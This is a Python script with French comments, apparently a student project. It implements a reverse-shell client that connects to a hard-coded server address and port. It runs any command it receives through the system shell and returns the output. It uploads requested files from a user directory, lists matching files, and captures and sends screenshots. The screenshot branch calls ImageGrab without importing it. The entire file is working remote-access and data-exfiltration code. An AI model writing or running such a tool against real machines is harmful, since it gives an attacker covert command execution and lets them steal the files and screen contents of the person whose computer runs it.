import socket
import subprocess
import os


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = "192.168.52.1"  # Adresse IP du serveur
port = 51152  # Port utilisé par le serveur

try:
    s.connect((server_address, port))
    
    print("Connexion établie avec le serveur.")
    
    while True:
        command = s.recv(1024).decode()  # Recevoir la commande du serveur
        if not command:
            break

        if command.lower() == "exit":
            break
        elif command.lower() == "download":
            # Recevoir le nom du fichier à télécharger
            filename = s.recv(1024).decode()

            # Construire le chemin absolu pour le fichier dans le dossier CLIENT
            client_filepath = os.path.join("C:/Users/soule/Documents/Projet", filename)

            # Vérifier si le fichier existe
            if os.path.exists(client_filepath):
                # Envoyer la taille du fichier au serveur
                filesize = os.path.getsize(client_filepath)
                s.sendall(str(filesize).encode())

                # Attendre l'accusé de réception du serveur avant d'envoyer le contenu
                s.recv(1024)

                # Ouvrir le fichier en mode lecture binaire
                with open(client_filepath, "rb") as file:
                    # Lire le contenu du fichier par paquets et l'envoyer au serveur
                    while True:
                        file_content = file.read(1024)
                        if not file_content:
                            break
                        s.sendall(file_content)

            else:
                # Envoyer un message indiquant que le fichier n'existe pas
                s.sendall(b"Le fichier n'existe pas.")
                
                
        elif command.lower() == "search":
            # Recevoir la commande "search" du serveur
            s.recv(1024)

            # Recevoir le début de la recherche du serveur
            search_string = s.recv(1024).decode()

            # Construire le chemin absolu pour le dossier CLIENT
            client_folder_path = "C:/Users/soule/Documents/Projet"

            # Chercher les fichiers/dossiers correspondants au début de la recherche
            matching_files = [
                f for f in os.listdir(client_folder_path) 
                if f.lower().startswith(search_string.lower()) and not f.startswith('.')
            ]

            # Envoyer la liste des fichiers/dossiers correspondants au serveur
            if matching_files:
                s.sendall(str(matching_files).encode())
            else:
                s.sendall("Le fichier/dossier n'existe pas.".encode())
                
                
        elif command.lower() == "screenshot":
            # Prendre une capture d'écran de l'écran principal
            screenshot = ImageGrab.grab()

            # Enregistrer la capture d'écran dans un fichier temporaire dans le dossier CLIENT
            screenshot_path = "C:/Users/soule/Documents/Projet/screenshot.png"
            screenshot.save(screenshot_path)

            # Envoyer la commande "upload_screenshot" au serveur
            s.sendall("upload_screenshot".encode())

            # Envoyer la taille du fichier au serveur
            filesize = os.path.getsize(screenshot_path)
            s.sendall(str(filesize).encode())

            # Attendre l'accusé de réception du serveur avant d'envoyer le contenu
            s.recv(1024)

            # Ouvrir le fichier en mode lecture binaire
            with open(screenshot_path, "rb") as file:
                # Lire le contenu du fichier par paquets et l'envoyer au serveur
                while True:
                    file_content = file.read(1024)
                    if not file_content:
                        break
                    s.sendall(file_content)

            # Supprimer le fichier temporaire sur le client
            #os.remove(screenshot_path)
            
            



        else:
            # Exécuter la commande sur le client et récupérer la sortie
            output = subprocess.getoutput(command)

            # Envoyer la sortie au serveur
            s.sendall(output.encode())



except KeyboardInterrupt:
    pass
finally:
    print("Connexion fermée.")
